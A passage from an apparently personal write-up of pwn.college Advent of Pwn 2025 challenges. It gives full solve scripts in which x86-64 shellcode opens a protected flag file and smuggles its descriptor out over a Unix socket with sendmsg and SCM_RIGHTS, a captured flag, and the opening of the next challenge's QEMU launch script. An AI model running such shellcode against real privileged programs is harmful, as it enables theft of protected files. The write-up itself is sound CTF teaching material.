[rsp+0x08] (8) msg_namelen    = 0
[rsp+0x10] (8) msg_iov        -&gt; &amp;rsp+0x40
[rsp+0x18] (8) msg_iovlen     = 1
[rsp+0x20] (8) msg_control    -&gt; &amp;rsp+0x50
[rsp+0x28] (8) msg_controllen = 24   (header (16, aligned) + data padded to alignment (8) = 24)
[rsp+0x30] (8) msg_flags      = 0
</pre></table></code></div></div><p>Then, place the 1-byte payload and iovec</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre>[rsp+0x68] = 'X'

iovec at [rsp+0x40]:
[rsp+0x40] (8)  iov_base -&gt; &amp;rsp+0x68
[rsp+0x48] (8)  iov_len  = 1
</pre></table></code></div></div><p>Next, build the control message buffer (cmsghdr + fd)</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre>cmsghdr at [rsp+0x50]:
[rsp+0x50] (8)  cmsg_len   = 20          (16 bytes header + 4 bytes FD)
[rsp+0x58] (4)  cmsg_level = 1           (SOL_SOCKET)
[rsp+0x5c] (4)  cmsg_type  = 1           (SCM_RIGHTS)
[rsp+0x60] (4)  cmsg_data  = flag_fd     (flag FD)
</pre></table></code></div></div><p>To the Kernel, our <code class="language-plaintext highlighter-rouge">sendmsg</code> call looks like this chain of pointers:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
</pre><td class="rouge-code"><pre>syscall(SYS_sendmsg, fd, &amp;msg_header, 0)
       |
       v
[ struct msghdr ] ------------------------------------.
|  msg_iov      |----&gt;  [ struct iovec     ]          |
|  msg_control  |--.    | base_addr -&gt; "X" |          |
'---------------'  |    | len       -&gt;  1  |          |
                   |    '------------------'          |
                   |                                  |
                   |                                  |
                   '-&gt;  [ struct cmsghdr ]            |
                        | cmsg_len   = 20             |
                        | cmsg_level = SOL_SOCKET     |
                        | cmsg_type  = SCM_RIGHTS     |
                        | cmsg_data  = [FD: 3]        |
                        '-----------------------------'
</pre></table></code></div></div><p><a href="/assets/img/AdventOfPwn2025/pic32.png" class="popup img-link normal shimmer"><img src="/assets/img/AdventOfPwn2025/pic32.png" alt="Desktop View" width="700" height="300" loading="lazy"></a></p><details> <summary>Click to view <code>solve.py</code></summary><div class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
</pre><td class="rouge-code"><pre><span class="kn">from</span> <span class="n">pwn</span> <span class="kn">import</span> <span class="o">*</span>
<span class="kn">import</span> <span class="n">socket</span>
<span class="kn">import</span> <span class="n">subprocess</span>
<span class="kn">import</span> <span class="n">time</span>

<span class="n">context</span><span class="p">.</span><span class="n">arch</span> <span class="o">=</span> <span class="sh">'</span><span class="s">amd64</span><span class="sh">'</span>
<span class="n">BINARY_PATH</span> <span class="o">=</span> <span class="sh">'</span><span class="s">/challenge/northpole-relay</span><span class="sh">'</span>
<span class="n">SOCKET_PATH</span> <span class="o">=</span> <span class="sh">"</span><span class="s">./socket</span><span class="sh">"</span>

<span class="n">shellcode_asm</span> <span class="o">=</span> <span class="sh">'''</span><span class="s">
    mov rax, 0x67616c662f
    push rax
    mov rsi, rsp

    /* openat(AT_FDCWD, </span><span class="sh">"</span><span class="s">flag</span><span class="sh">"</span><span class="s">, O_RDONLY) */
    mov edi, -100
    xor edx, edx
    xor r10d, r10d
    mov eax, 257
    syscall

    mov r12, rax    /* FD*/

    sub rsp, 0x80

    mov byte ptr [rsp+0x68], </span><span class="sh">'</span><span class="s">X</span><span class="sh">'</span><span class="s">
    lea rax, [rsp+0x68]
    mov [rsp+0x40], rax         /* iov_base */
    mov qword ptr [rsp+0x48], 1 /* iov_len */

    mov qword ptr [rsp+0x50], 20   /* cmsg_len */
    mov dword ptr [rsp+0x58], 1    /* SOL_SOCKET */
    mov dword ptr [rsp+0x5c], 1    /* SCM_RIGHTS */
    mov eax, r12d
    mov [rsp+0x60], eax  

    xor rax, rax
    mov [rsp+0x00], rax            /* msg_name */
    mov [rsp+0x08], rax            /* msg_namelen */
    lea rax, [rsp+0x40]
    mov [rsp+0x10], rax            /* msg_iov */
    mov qword ptr [rsp+0x18], 1    /* msg_iovlen */
    lea rax, [rsp+0x50]
    mov [rsp+0x20], rax            /* msg_control */
    mov qword ptr [rsp+0x28], 24   /* msg_controllen */
    xor rax, rax
    mov [rsp+0x30], rax            /* msg_flags */

    /* sendmsg(1, msg, 0) */
    mov edi, 1
    mov rsi, rsp
    xor edx, edx
    mov eax, 46
    syscall

    /* Exit group */
    xor edi, edi
    mov eax, 231
    syscall
</span><span class="sh">'''</span>

<span class="n">payload</span> <span class="o">=</span> <span class="nf">asm</span><span class="p">(</span><span class="n">shellcode_asm</span><span class="p">)</span>

<span class="n">sock</span> <span class="o">=</span> <span class="n">socket</span><span class="p">.</span><span class="nf">socket</span><span class="p">(</span><span class="n">socket</span><span class="p">.</span><span class="n">AF_UNIX</span><span class="p">,</span> <span class="n">socket</span><span class="p">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
<span class="k">try</span><span class="p">:</span>
    <span class="n">sock</span><span class="p">.</span><span class="nf">connect</span><span class="p">(</span><span class="n">SOCKET_PATH</span><span class="p">)</span>
<span class="k">except</span> <span class="nb">FileNotFoundError</span><span class="p">:</span>
    <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">Error</span><span class="sh">"</span><span class="p">)</span>
    <span class="nf">exit</span><span class="p">()</span>

<span class="n">process</span> <span class="o">=</span> <span class="n">subprocess</span><span class="p">.</span><span class="nc">Popen</span><span class="p">(</span>
    <span class="p">[</span><span class="n">BINARY_PATH</span><span class="p">],</span> 
    <span class="n">stdin</span><span class="o">=</span><span class="n">subprocess</span><span class="p">.</span><span class="n">PIPE</span><span class="p">,</span> 
    <span class="n">stdout</span><span class="o">=</span><span class="n">sock</span><span class="p">.</span><span class="nf">fileno</span><span class="p">(),</span>
    <span class="n">stderr</span><span class="o">=</span><span class="n">subprocess</span><span class="p">.</span><span class="n">PIPE</span>
<span class="p">)</span>

<span class="n">process</span><span class="p">.</span><span class="n">stdin</span><span class="p">.</span><span class="nf">write</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
<span class="n">process</span><span class="p">.</span><span class="n">stdin</span><span class="p">.</span><span class="nf">flush</span><span class="p">()</span>

<span class="n">time</span><span class="p">.</span><span class="nf">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
<span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">Send done</span><span class="sh">"</span><span class="p">)</span>
</pre></table></code></div></div></details> <details> <summary>Click to view <code>get_flag.py</code></summary><div class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
</pre><td class="rouge-code"><pre><span class="kn">import</span> <span class="n">socket</span>
<span class="kn">import</span> <span class="n">struct</span>
<span class="kn">import</span> <span class="n">os</span>

<span class="n">SOCKET_PATH</span> <span class="o">=</span> <span class="sh">"</span><span class="s">./socket</span><span class="sh">"</span>

<span class="k">if</span> <span class="n">os</span><span class="p">.</span><span class="n">path</span><span class="p">.</span><span class="nf">exists</span><span class="p">(</span><span class="n">SOCKET_PATH</span><span class="p">):</span>
    <span class="n">os</span><span class="p">.</span><span class="nf">remove</span><span class="p">(</span><span class="n">SOCKET_PATH</span><span class="p">)</span>

<span class="n">server</span> <span class="o">=</span> <span class="n">socket</span><span class="p">.</span><span class="nf">socket</span><span class="p">(</span><span class="n">socket</span><span class="p">.</span><span class="n">AF_UNIX</span><span class="p">,</span> <span class="n">socket</span><span class="p">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
<span class="n">server</span><span class="p">.</span><span class="nf">bind</span><span class="p">(</span><span class="n">SOCKET_PATH</span><span class="p">)</span>
<span class="n">server</span><span class="p">.</span><span class="nf">listen</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>

<span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">Waiting...</span><span class="sh">"</span><span class="p">)</span>

<span class="n">conn</span><span class="p">,</span> <span class="n">addr</span> <span class="o">=</span> <span class="n">server</span><span class="p">.</span><span class="nf">accept</span><span class="p">()</span>
<span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">Connected</span><span class="sh">"</span><span class="p">)</span>

<span class="n">data_len</span> <span class="o">=</span> <span class="mi">100</span>
<span class="n">ancillary_len</span> <span class="o">=</span> <span class="n">socket</span><span class="p">.</span><span class="nc">CMSG_LEN</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span> 

<span class="n">data</span><span class="p">,</span> <span class="n">ancdata</span><span class="p">,</span> <span class="n">flags</span><span class="p">,</span> <span class="n">addr</span> <span class="o">=</span> <span class="n">conn</span><span class="p">.</span><span class="nf">recvmsg</span><span class="p">(</span><span class="n">data_len</span><span class="p">,</span> <span class="n">ancillary_len</span><span class="p">)</span>

<span class="n">recv_fd</span> <span class="o">=</span> <span class="mi">0</span>
<span class="k">for</span> <span class="n">cmsg_level</span><span class="p">,</span> <span class="n">cmsg_type</span><span class="p">,</span> <span class="n">cmsg_data</span> <span class="ow">in</span> <span class="n">ancdata</span><span class="p">:</span>
    <span class="k">if</span> <span class="n">cmsg_level</span> <span class="o">==</span> <span class="n">socket</span><span class="p">.</span><span class="n">SOL_SOCKET</span> <span class="ow">and</span> <span class="n">cmsg_type</span> <span class="o">==</span> <span class="n">socket</span><span class="p">.</span><span class="n">SCM_RIGHTS</span><span class="p">:</span>
        <span class="n">recv_fd</span> <span class="o">=</span> <span class="n">struct</span><span class="p">.</span><span class="nf">unpack</span><span class="p">(</span><span class="sh">'</span><span class="s">i</span><span class="sh">'</span><span class="p">,</span> <span class="n">cmsg_data</span><span class="p">[:</span><span class="mi">4</span><span class="p">])[</span><span class="mi">0</span><span class="p">]</span>
        <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">Recieve FD: </span><span class="si">{</span><span class="n">recv_fd</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
        <span class="k">break</span>

<span class="k">if</span> <span class="n">recv_fd</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">:</span>
    <span class="k">try</span><span class="p">:</span>
        <span class="n">os</span><span class="p">.</span><span class="nf">lseek</span><span class="p">(</span><span class="n">recv_fd</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">os</span><span class="p">.</span><span class="n">SEEK_SET</span><span class="p">)</span>
        
        <span class="n">flag_content</span> <span class="o">=</span> <span class="n">os</span><span class="p">.</span><span class="nf">read</span><span class="p">(</span><span class="n">recv_fd</span><span class="p">,</span> <span class="mi">1024</span><span class="p">)</span>
        <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">FLAG: </span><span class="si">{</span><span class="n">flag_content</span><span class="p">.</span><span class="nf">decode</span><span class="p">()</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
        
        <span class="n">os</span><span class="p">.</span><span class="nf">close</span><span class="p">(</span><span class="n">recv_fd</span><span class="p">)</span>
    <span class="k">except</span> <span class="nb">OSError</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
        <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">Error FD: </span><span class="si">{</span><span class="n">e</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
<span class="k">else</span><span class="p">:</span>
    <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">No fd</span><span class="sh">"</span><span class="p">)</span>

<span class="n">conn</span><span class="p">.</span><span class="nf">close</span><span class="p">()</span>
<span class="n">server</span><span class="p">.</span><span class="nf">close</span><span class="p">()</span>
<span class="n">os</span><span class="p">.</span><span class="nf">remove</span><span class="p">(</span><span class="n">SOCKET_PATH</span><span class="p">)</span>
</pre></table></code></div></div></details><p>Flag: <code class="language-plaintext highlighter-rouge">pwn.college{UXZOqF3EGChF5M3hiPbsTqz5vQR.0VO1EjMywiN1UDN0EzW}</code></p><hr /><h2 id="day11"><span class="me-2">Day11</span><a href="#day11" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><hr /><h3 id="description-10"><span class="me-2">Description</span><a href="#description-10" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>üéÖüéÑ <strong>A Surprise From the Bottom of Santa‚Äôs Bag‚Ä¶</strong> ‚ú®<br /> While Santa was unloading gifts this year, something <em>thumped</em> at the very bottom of his Christmas bag.<br /> After brushing off a blizzard of stale cookie crumbs ‚ùÑÔ∏èüç™, he discovered‚Ä¶</p><p>üñ•Ô∏è <strong>A BRAND NEW COMPUTER!</strong> üíæ<br /> (Brand new‚Ä¶ <strong>in 1994</strong>, that is.)</p><p>It comes with a stack of <strong>vintage floppy disks</strong>, a power brick that absolutely should not be this warm üîåüî•, and a handwritten North Pole Tech Support card that simply reads:</p><blockquote><p><em>‚ÄúGood luck setting it up! Ho-ho-retro!‚Äù</em></p></blockquote><p>So fire up that beige box, pop in a floppy or three, and prepare yourself‚Äî<br /> because nothing says <em>Happy Holidays</em> like convincing 30-year-old hardware to connect to the network! üéÅ</p><p>When things inevitably go sideways, don‚Äôt panic‚Äî<br /> üìû <strong>NORTH POLE TECH SUPPORT:</strong> <strong>1-800-242-8478</strong><br /> üßù‚Äç‚ôÇÔ∏èüîß North Pole elves are standing by to assist you with any tech-support needs.<br /> <em>Seriously. Call them. They‚Äôd be happy to help; just let them know what you‚Äôre seeing.</em></p><p>Once you‚Äôve got the system up and running‚Äîand after you‚Äôve battled the screeching modem üì° to get online‚Äî<br /> üéÅ <strong>connect to <code class="language-plaintext highlighter-rouge">192.168.13.37</code> on port <code class="language-plaintext highlighter-rouge">1337</code> to earn your flag.</strong></p><hr /><blockquote><p><em>NOTE: This challenge requires a GUI to interact with the vintage computer, and so must be accessed through the <a href="https://pwn.college/workspace/desktop">desktop interface</a>.</em></p></blockquote><hr /><h3 id="analysis-10"><span class="me-2">Analysis</span><a href="#analysis-10" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><details> <summary>Click to view <code>launch</code></summary><div class="language-sh highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
92
93
94
95
96
97
98
99
100
101
102
103
104
105
106
107
108
109
110
111
112
113
114
115
116
117
118
119
120
121
122
123
124
125
126
127
128
129
130
131
132
133
134
135
136
137
138
139
140
141
142
143
144
145
146
147
148
149
150
151
152
153
154
155
156
157
158
159
160
161
162
163
164
165
166
167
168
169
170
171
172
173
174
175
176
177
178
179
180
181
182
183
184
185
186
187
188
189
190
191
192
193
194
195
196
197
198
199
200
201
202
203
204
205
206
207
208
209
210
211
212
213
214
215
216
217
218
219
220
221
222
223
224
225
226
227
228
229
230
231
232
233
234
235
236
237
238
239
240
241
242
243
244
245
246
247
248
249
250
251
252
253
254
255
256
257
258
259
260
261
262
263
264
265
266
</pre><td class="rouge-code"><pre><span class="c">#!/usr/bin/exec-suid --real -- /bin/bash</span>

<span class="nb">set</span> <span class="nt">-euo</span> pipefail
<span class="nb">umask </span>077

<span class="nb">cd</span> /challenge

<span class="nb">mkdir</span> <span class="nt">-p</span> <span class="s2">"/challenge/work"</span>

<span class="nv">DOS_IMG</span><span class="o">=</span><span class="s2">"/challenge/work/qemu-dos-</span><span class="nv">$$</span><span class="s2">.raw"</span>
<span class="nv">MONITOR_PIPE</span><span class="o">=</span><span class="s2">"/challenge/work/qemu-monitor-</span><span class="nv">$$</span><span class="s2">"</span>
<span class="nv">SNAPSHOT_FILE</span><span class="o">=</span><span class="s2">"/challenge/work/dos-snapshot"</span>

<span class="nv">BRIDGE_NAME</span><span class="o">=</span><span class="s2">"br-qemu</span><span class="nv">$$</span><span class="s2">"</span>
<span class="nv">TAP_DOS</span><span class="o">=</span><span class="s2">"tap-dos</span><span class="nv">$$</span><span class="s2">"</span>
<span class="nv">FLAG_NS</span><span class="o">=</span><span class="s2">"nsflag</span><span class="nv">$$</span><span class="s2">"</span>
<span class="nv">VETH_HOST</span><span class="o">=</span><span class="s2">"vfh</span><span class="nv">$$</span><span class="s2">"</span>
<span class="nv">VETH_NS</span><span class="o">=</span><span class="s2">"vfn</span><span class="nv">$$</span><span class="s2">"</span>

<span class="nv">FLAG_SERVER_IP</span><span class="o">=</span><span class="s2">"192.168.13.37"</span>
<span class="nv">FLAG_SERVER_PORT</span><span class="o">=</span>1337

<span class="nv">DOS_PID</span><span class="o">=</span><span class="s2">""</span>
<span class="nv">CAT_PID</span><span class="o">=</span><span class="s2">""</span>
<span class="nv">FLAG_SERVER_PID</span><span class="o">=</span><span class="s2">""</span>

<span class="k">if</span> <span class="o">[</span> <span class="nt">-z</span> <span class="s2">"</span><span class="k">${</span><span class="nv">DISPLAY</span><span class="p">-</span><span class="k">}</span><span class="s2">"</span> <span class="o">]</span><span class="p">;</span> <span class="k">then
    </span><span class="nb">echo</span> <span class="s2">"You must run this script from the desktop environment!"</span>
    <span class="nb">exit </span>1
<span class="k">fi</span>

<span class="c"># Type content to QEMU via sendkey commands</span>
<span class="c"># $1: monitor fifo</span>
<span class="c"># $2: content to type</span>
<span class="c"># $3: if set, press Home after every newline (to fight autoindent)</span>
type_content<span class="o">()</span> <span class="o">{</span>
    <span class="nb">local </span><span class="nv">monitor_fifo</span><span class="o">=</span><span class="s2">"</span><span class="nv">$1</span><span class="s2">"</span>
    <span class="nb">local </span><span class="nv">content</span><span class="o">=</span><span class="s2">"</span><span class="nv">$2</span><span class="s2">"</span>
    <span class="nb">local </span><span class="nv">home_after_newline</span><span class="o">=</span><span class="s2">"</span><span class="nv">$3</span><span class="s2">"</span>

    <span class="k">while </span><span class="nv">IFS</span><span class="o">=</span> <span class="nb">read</span> <span class="nt">-r</span> <span class="nt">-n1</span> char<span class="p">;</span> <span class="k">do</span>
        <span class="o">[</span> <span class="nt">-z</span> <span class="s2">"</span><span class="nv">$char</span><span class="s2">"</span> <span class="o">]</span> <span class="o">&amp;&amp;</span> <span class="nv">char</span><span class="o">=</span><span class="s1">$'</span><span class="se">\n</span><span class="s1">'</span>
        <span class="nv">key</span><span class="o">=</span><span class="s2">""</span>
        <span class="k">case</span> <span class="s2">"</span><span class="nv">$char</span><span class="s2">"</span> <span class="k">in</span>
            <span class="o">[</span>a-z]<span class="p">)</span> <span class="nv">key</span><span class="o">=</span><span class="s2">"</span><span class="nv">$char</span><span class="s2">"</span> <span class="p">;;</span>
            <span class="o">[</span>A-Z]<span class="p">)</span> <span class="nv">key</span><span class="o">=</span><span class="s2">"shift-</span><span class="si">$(</span><span class="nb">echo</span> <span class="s2">"</span><span class="nv">$char</span><span class="s2">"</span> | <span class="nb">tr</span> <span class="s1">'[:upper:]'</span> <span class="s1">'[:lower:]'</span><span class="si">)</span><span class="s2">"</span> <span class="p">;;</span>
            <span class="o">[</span>0-9]<span class="p">)</span> <span class="nv">key</span><span class="o">=</span><span class="s2">"</span><span class="nv">$char</span><span class="s2">"</span> <span class="p">;;</span>
            <span class="s1">' '</span><span class="p">)</span> <span class="nv">key</span><span class="o">=</span><span class="s2">"spc"</span> <span class="p">;;</span>
            <span class="s1">$'</span><span class="se">\n</span><span class="s1">'</span><span class="p">)</span> <span class="nv">key</span><span class="o">=</span><span class="s2">"ret"</span> <span class="p">;;</span>
            <span class="s1">$'</span><span class="se">\t</span><span class="s1">'</span><span class="p">)</span> <span class="nv">key</span><span class="o">=</span><span class="s2">"tab"</span> <span class="p">;;</span>
            <span class="s1">'-'</span><span class="p">)</span> <span class="nv">key</span><span class="o">=</span><span class="s2">"minus"</span> <span class="p">;;</span>
            <span class="s1">'='</span><span class="p">)</span> <span class="nv">key</span><span class="o">=</span><span class="s2">"equal"</span> <span class="p">;;</span>
            <span class="s1">'['</span><span class="p">)</span> <span class="nv">key</span><span class="o">=</span><span class="s2">"bracket_left"</span> <span class="p">;;</span>
            <span class="s1">']'</span><span class="p">)</span> <span class="nv">key</span><span class="o">=</span><span class="s2">"bracket_right"</span> <span class="p">;;</span>
            <span class="s1">';'</span><span class="p">)</span> <span class="nv">key</span><span class="o">=</span><span class="s2">"semicolon"</span> <span class="p">;;</span>
            <span class="s2">"'"</span><span class="p">)</span> <span class="nv">key</span><span class="o">=</span><span class="s2">"apostrophe"</span> <span class="p">;;</span>
            <span class="s1">'`'</span><span class="p">)</span> <span class="nv">key</span><span class="o">=</span><span class="s2">"grave_accent"</span> <span class="p">;;</span>
            <span class="s1">'\\'</span><span class="p">)</span> <span class="nv">key</span><span class="o">=</span><span class="s2">"backslash"</span> <span class="p">;;</span>
            <span class="s1">','</span><span class="p">)</span> <span class="nv">key</span><span class="o">=</span><span class="s2">"comma"</span> <span class="p">;;</span>
            <span class="s1">'.'</span><span class="p">)</span> <span class="nv">key</span><span class="o">=</span><span class="s2">"dot"</span> <span class="p">;;</span>
            <span class="s1">'/'</span><span class="p">)</span> <span class="nv">key</span><span class="o">=</span><span class="s2">"slash"</span> <span class="p">;;</span>
            <span class="s1">'!'</span><span class="p">)</span> <span class="nv">key</span><span class="o">=</span><span class="s2">"shift-1"</span> <span class="p">;;</span>
            <span class="s1">'@'</span><span class="p">)</span> <span class="nv">key</span><span class="o">=</span><span class="s2">"shift-2"</span> <span class="p">;;</span>
            <span class="s1">'#'</span><span class="p">)</span> <span class="nv">key</span><span class="o">=</span><span class="s2">"shift-3"</span> <span class="p">;;</span>
            <span class="s1">'$'</span><span class="p">)</span> <span class="nv">key</span><span class="o">=</span><span class="s2">"shift-4"</span> <span class="p">;;</span>
            <span class="s1">'%'</span><span class="p">)</span> <span class="nv">key</span><span class="o">=</span><span class="s2">"shift-5"</span> <span class="p">;;</span>
            <span class="s1">'^'</span><span class="p">)</span> <span class="nv">key</span><span class="o">=</span><span class="s2">"shift-6"</span> <span class="p">;;</span>
            <span class="s1">'&amp;'</span><span class="p">)</span> <span class="nv">key</span><span class="o">=</span><span class="s2">"shift-7"</span> <span class="p">;;</span>
            <span class="s1">'*'</span><span class="p">)</span> <span class="nv">key</span><span class="o">=</span><span class="s2">"shift-8"</span> <span class="p">;;</span>
            <span class="s1">'('</span><span class="p">)</span> <span class="nv">key</span><span class="o">=</span><span class="s2">"shift-9"</span> <span class="p">;;</span>
            <span class="s1">')'</span><span class="p">)</span> <span class="nv">key</span><span class="o">=</span><span class="s2">"shift-0"</span> <span class="p">;;</span>
            <span class="s1">'_'</span><span class="p">)</span> <span class="nv">key</span><span class="o">=</span><span class="s2">"shift-minus"</span> <span class="p">;;</span>
            <span class="s1">'+'</span><span class="p">)</span> <span class="nv">key</span><span class="o">=</span><span class="s2">"shift-equal"</span> <span class="p">;;</span>
            <span class="s1">'{'</span><span class="p">)</span> <span class="nv">key</span><span class="o">=</span><span class="s2">"shift-bracket_left"</span> <span class="p">;;</span>
            <span class="s1">'}'</span><span class="p">)</span> <span class="nv">key</span><span class="o">=</span><span class="s2">"shift-bracket_right"</span> <span class="p">;;</span>
            <span class="s1">':'</span><span class="p">)</span> <span class="nv">key</span><span class="o">=</span><span class="s2">"shift-semicolon"</span> <span class="p">;;</span>
            <span class="s1">'"'</span><span class="p">)</span> <span class="nv">key</span><span class="o">=</span><span class="s2">"shift-apostrophe"</span> <span class="p">;;</span>
            <span class="s1">'~'</span><span class="p">)</span> <span class="nv">key</span><span class="o">=</span><span class="s2">"shift-grave_accent"</span> <span class="p">;;</span>
            <span class="s1">'|'</span><span class="p">)</span> <span class="nv">key</span><span class="o">=</span><span class="s2">"shift-backslash"</span> <span class="p">;;</span>
            <span class="s1">'&lt;'</span><span class="p">)</span> <span class="nv">key</span><span class="o">=</span><span class="s2">"shift-comma"</span> <span class="p">;;</span>
            <span class="s1">'&gt;'</span><span class="p">)</span> <span class="nv">key</span><span class="o">=</span><span class="s2">"shift-dot"</span> <span class="p">;;</span>
            <span class="s1">'?'</span><span class="p">)</span> <span class="nv">key</span><span class="o">=</span><span class="s2">"shift-slash"</span> <span class="p">;;</span>
            <span class="k">*</span><span class="p">)</span> <span class="k">continue</span> <span class="p">;;</span>  <span class="c"># Skip unsupported characters</span>
        <span class="k">esac</span>
        <span class="k">if</span> <span class="o">[</span> <span class="nt">-n</span> <span class="s2">"</span><span class="nv">$key</span><span class="s2">"</span> <span class="o">]</span><span class="p">;</span> <span class="k">then
            </span><span class="nb">echo</span> <span class="s2">"sendkey </span><span class="nv">$key</span><span class="s2">"</span> <span class="o">&gt;</span> <span class="s2">"</span><span class="nv">$monitor_fifo</span><span class="s2">"</span>
            <span class="nb">sleep </span>0.05
            <span class="c"># Press Home after newline if requested</span>
            <span class="k">if</span> <span class="o">[</span> <span class="nt">-n</span> <span class="s2">"</span><span class="nv">$home_after_newline</span><span class="s2">"</span> <span class="o">]</span> <span class="o">&amp;&amp;</span> <span class="o">[</span> <span class="s2">"</span><span class="nv">$key</span><span class="s2">"</span> <span class="o">=</span> <span class="s2">"ret"</span> <span class="o">]</span><span class="p">;</span> <span class="k">then
                </span><span class="nb">echo</span> <span class="s2">"sendkey home"</span> <span class="o">&gt;</span> <span class="s2">"</span><span class="nv">$monitor_fifo</span><span class="s2">"</span>
                <span class="nb">sleep </span>0.005
            <span class="k">fi
        fi
    done</span> <span class="o">&lt;&lt;&lt;</span> <span class="s2">"</span><span class="nv">$content</span><span class="s2">"</span>
<span class="o">}</span>

monitor_menu<span class="o">()</span> <span class="o">{</span>
    <span class="nb">local </span><span class="nv">monitor_fifo</span><span class="o">=</span><span class="s2">"</span><span class="nv">$1</span><span class="s2">"</span>

    <span class="nb">local </span>term_height term_width
    <span class="nv">term_height</span><span class="o">=</span><span class="si">$(</span>tput lines 2&gt;/dev/null <span class="o">||</span> <span class="nb">echo </span>24<span class="si">)</span>
    <span class="nv">term_width</span><span class="o">=</span><span class="si">$(</span>tput cols 2&gt;/dev/null <span class="o">||</span> <span class="nb">echo </span>80<span class="si">)</span>
    <span class="nb">local </span><span class="nv">menu_height</span><span class="o">=</span><span class="k">$((</span>term_height <span class="o">*</span> <span class="m">80</span> <span class="o">/</span> <span class="m">100</span><span class="k">))</span>
    <span class="nb">local </span><span class="nv">menu_width</span><span class="o">=</span><span class="k">$((</span>term_width <span class="o">*</span> <span class="m">80</span> <span class="o">/</span> <span class="m">100</span><span class="k">))</span>
    <span class="o">[</span> <span class="nv">$menu_height</span> <span class="nt">-lt</span> 15 <span class="o">]</span> <span class="o">&amp;&amp;</span> <span class="nv">menu_height</span><span class="o">=</span>15
    <span class="o">[</span> <span class="nv">$menu_height</span> <span class="nt">-gt</span> 40 <span class="o">]</span> <span class="o">&amp;&amp;</span> <span class="nv">menu_height</span><span class="o">=</span>40
    <span class="o">[</span> <span class="nv">$menu_width</span> <span class="nt">-lt</span> 50 <span class="o">]</span> <span class="o">&amp;&amp;</span> <span class="nv">menu_width</span><span class="o">=</span>50
    <span class="o">[</span> <span class="nv">$menu_width</span> <span class="nt">-gt</span> 100 <span class="o">]</span> <span class="o">&amp;&amp;</span> <span class="nv">menu_width</span><span class="o">=</span>100
    <span class="nb">local </span><span class="nv">list_height</span><span class="o">=</span><span class="k">$((</span>menu_height <span class="o">-</span> <span class="m">8</span><span class="k">))</span>

    <span class="k">while </span><span class="nb">true</span><span class="p">;</span> <span class="k">do
